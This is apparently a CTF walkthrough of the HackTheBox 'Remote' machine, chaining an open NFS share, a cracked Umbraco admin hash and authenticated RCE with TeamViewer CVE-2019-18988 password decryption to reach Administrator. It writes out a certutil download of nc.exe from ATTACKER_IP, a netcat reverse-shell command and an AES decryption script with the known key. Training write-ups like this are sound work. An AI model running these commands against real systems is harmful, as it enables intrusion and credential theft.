## Welcome everyone!

Today, we will explore “Remote”, a machine from HackTheBox.

![image](/HTB/Remote/Remote_images/1.png)

(Please ensure that you have added the following line `TARGET_IP   remote.htb` to your local `/etc/hosts` file to enable DNS resolution)

## Information Gathering

First, we will perform an aggressive **Nmap** scan to gather as much information as possible about the system we’re targeting:

![image](/HTB/Remote/Remote_images/2.png)

We can identify several services running:

**FTP** (Port 21)

**HTTP** (Port 80)

**RPCbind** (Port 111)

**RPC** (Port 135)

**NetBIOS** (Port 139)

**SMB** (Port 445)

**NFS** (Port 2049)

**WinRM** (Port 5985)

Our enumeration set is large. Attempting to access the first FTP service anonymously is successful; however, no files were found:

![image](/HTB/Remote/Remote_images/3.png)

We identified an NFS share, so let’s enumerate it to see whether anonymous access is possible:

![image](/HTB/Remote/Remote_images/4.png)

Indeed, that is the case. A `/site_backups` share is accessible publicly. Let’s attach this share to a local folder in order to access it from our machine with the following command (as `root`):

`mount -o rw TARGET_IP:/site_backups /local/folder`

![image](/HTB/Remote/Remote_images/5.png)

The share has successfully been attached to the local folder, allowing us to interact with it. We can suggest from the directory listing shown above that an Umbraco CMS has been configured within the target system, and it is probably accessible from the port 80 discovered earlier. Listing the `Umbraco` folder reveals a huge quantity of files, and it is easy to get drowned in them. Researching Umbraco credential files shows us that the `Umbraco.sdf` file stores application credentials. This file is located in the `App_Data` directory:

![image](/HTB/Remote/Remote_images/6.png)

The **admin** user's SHA-1 hash has successfully been recovered. Since SHA-1 is nowadays considered a weak hashing algorithm, if the password is weak, we could crack it offline and use it to authenticate ourselves on the Umbraco login panel. Let’s paste the hash into a file before passing it to **John the Ripper**:

![image](/HTB/Remote/Remote_images/7.png)

We successfully cracked the admin user's password, allowing us to authenticate on the Umbraco login panel with the following credentials:

`admin:baconandcheese`

Let’s use **Gobuster** to perform web directory fuzzing against the website hosted on port 80 in order to identify the login panel:

![image](/HTB/Remote/Remote_images/8.png)

The `umbraco` endpoint has been identified, strongly suggesting that we have to access it in order to authenticate ourselves:

![image](/HTB/Remote/Remote_images/9.png)

Indeed, that is the case. We can observe in the username field a line mentioning that the employee email address represents the username to use. `admin@htb.local` has been identified earlier, so let’s attempt to provide the following credentials:

`admin@htb.local:baconandcheese`

![image](/HTB/Remote/Remote_images/10.png)

![image](/HTB/Remote/Remote_images/11.png)

We successfully authenticated ourselves to the Umbraco CMS dashboard as the **admin** user.

Clicking on our profile icon in the upper-left corner of the page allows us to identify the CMS version, which is **7.12.4**:

![image](/HTB/Remote/Remote_images/13.png)

Since we have authenticated access to an identified web application, let’s research some common vulnerabilities:

![image](/HTB/Remote/Remote_images/14.png)

An authenticated **Remote Code Execution** (RCE) can be achieved by an attacker targeting **Umbraco CMS 7.12.4**. This is perfect for us because, as we can see above, Exploit-DB hosts a Python script that leverages the vulnerability affecting this version, which can be fetched on Kali through the `searchsploit -m 46153.py` command. I recommend using the newer script version available [here](https://exploit.company/exploits/umbraco-cms-7-12-4-remote-code-execution-authenticated/) to avoid any issues. On my side, I used it for the demonstration.

We could execute the script with the `-h` switch to obtain more information about its usage:

![image](/HTB/Remote/Remote_images/15.png)

As expected, valid credentials and the target host are required. We could use the `-c` switch to execute a system command and the `-a` switch for arguments. I would say the last one is very important, because trying without it won’t work properly (all I was able to execute was the `whoami` command). Indeed, because we’re dealing with a Windows machine, we need to use the `cmd.exe` program paired with the `/c <COMMAND>` argument pattern to execute commands properly.

The following command was executed to confirm the RCE:

`python3 script.py -u admin@htb.local -p baconandcheese -i <http://remote.htb> -c "cmd.exe" -a '/c whoami'`

![image](/HTB/Remote/Remote_images/16.png)

Our exploit worked perfectly. It appears that we are able to execute system commands as the **IIS APPPOOL\DefaultAppPool** user, which is pretty much like the **www-data** web user in a Linux environment, but for [ASP.NET](http://ASP.NET).

We could upload an `nc.exe` binary hosted on a Python server locally to a writable target folder such as `C:\Windows\Temp` to initiate a reverse shell through Netcat and obtain our initial foothold. The binary can be fetched locally on the target with the following `certutil` command:

`certutil -urlcache -f http://ATTACKER_IP:PORT/nc.exe c:\\windows\\Temp\\nc.exe`

(The script and the target machine strictly require this syntax.)

![image](/HTB/Remote/Remote_images/17.png)

Now that we have the Netcat binary, we could execute this final command to initiate our reverse shell from the target system to our machine:

`python3 script.py -u admin@htb.local -p baconandcheese -i <http://remote.htb> -c "cmd.exe" -a '/c c:\\windows\\Temp\\nc.exe -e cmd.exe ATTACKER_IP NC_PORT'`

(Ensure that you have set up a **Netcat listener** on your local machine through `nc -lvnp PORT` to catch the connection.)

![image](/HTB/Remote/Remote_images/18.png)

The script should hang as shown above, resulting in a successful system takeover as the `IIS APPPOOL\DefaultAppPool` user. The first flag can be accessed in the public `C:\Users\Public\Desktop\` directory:

![image](/HTB/Remote/Remote_images/19.png)

## Privilege Escalation

We now need to find a way to escalate our privileges in order to retrieve the protected root flag.

The `C:\Users\Public\Desktop` also contains a `TeamViewer 7.lnk` file. This could be a hint concerning the **TeamViewer** software installed on the local system, which appears to be its seventh version. Researching any vulnerabilities affecting this software version leads us to the **CVE-2019-18988** credentials exposure vulnerability:

![image](/HTB/Remote/Remote_images/20.png)

This vulnerability allows us to enumerate and decrypt TeamViewer credentials from the Windows Registry. [This *Why Not Security* article](https://whynotsecurity.com/blog/teamviewer/) explains that, by having the password to a TeamViewer installation and the scripting engine enabled, we could escalate from a low-privileged user (such as the web user we have) to `NT AUTHORITY\SYSTEM` by only reading the registry. The vulnerability is caused by the use of a reversible AES-128-CBC encryption scheme with a known key and IV, with the encrypted password stored in the `HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7\SecurityPasswordAES` registry value. This allows an attacker with local access to retrieve and decrypt the stored TeamViewer password.

We could execute the following command to query and confirm whether we are able to read from the registry by listing all keys and sub-keys present in it with the `/s` argument:

`reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer /s`

![image](/HTB/Remote/Remote_images/21.png)

Here, the `SecurityPasswordAES` line is what interests us: it contains the **encrypted TeamViewer password (ciphertext)**. It is not the AES key itself. We successfully extracted the following ciphertext:

`FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B`

We can now decrypt this ciphertext using the known AES-128-CBC key and IV.

The article provided above includes a Python script for the cipher decryption:

```
import sys, hexdump, binascii
from Crypto.Cipher import AES

class AESCipher:
    def __init__(self, key):
        self.key = key

    def decrypt(self, iv, data):
        self.cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self.cipher.decrypt(data)

key = binascii.unhexlify("0602000000a400005253413100040000")
iv = binascii.unhexlify("0100010067244F436E6762F25EA8D704")
hex_str_cipher = "d690a9d0a592327f99bb4c6a6b6d4cbe"  # output from the registry
ciphertext = binascii.unhexlify(hex_str_cipher)

raw_un = AESCipher(key).decrypt(iv, ciphertext)

print(hexdump.hexdump(raw_un))

password = raw_un.decode('utf-16')
print(password)
```

All we have to do is replace the `hex_str_cipher` value with the one we extracted from the registry.

![image](/HTB/Remote/Remote_images/22.png)

The password has successfully been recovered from ciphertext to the `!R3m0te!` plaintext password. This allows us to attempt to authenticate as the `Administrator` user through the WinRM protocol by using `evil-winrm`:

![image](/HTB/Remote/Remote_images/23.png)

It worked! We successfully gained access to the **Administrator** account. We can still verify it with `whoami /priv`:

![image](/HTB/Remote/Remote_images/24.png)

Indeed, several privileges are enabled, confirming that we have fully compromised the target system, allowing us to retrieve the final flag in the `C:\Users\Administrator\Desktop\` directory:

![image](/HTB/Remote/Remote_images/25.png)

Challenge completed!

![image](/HTB/Remote/Remote_images/26.png)

## Conclusion

This room was pleasant to complete. Starting from a publicly accessible **NFS share**, we extracted hardcoded credentials that we used to gain authenticated access to an **Umbraco** CMS dashboard. This allowed us to identify the application’s version, which was vulnerable to an authenticated **Remote Code Execution**. From this initial foothold on the target system, we discovered that **TeamViewer 7** was deployed on the target. Researching this software version led us to **CVE-2019-18988**, which allows an attacker with local access to retrieve the encrypted TeamViewer password from the Windows Registry and decrypt it using the known AES-128-CBC key and IV. We could then recover the plaintext password `!R3m0te!` and use it to authenticate as the **Administrator** user, resulting in a full compromise and control of the target.

This challenge demonstrates how multiple weaknesses can be chained together to cause an entire system compromise.

**Thank you for reading!**
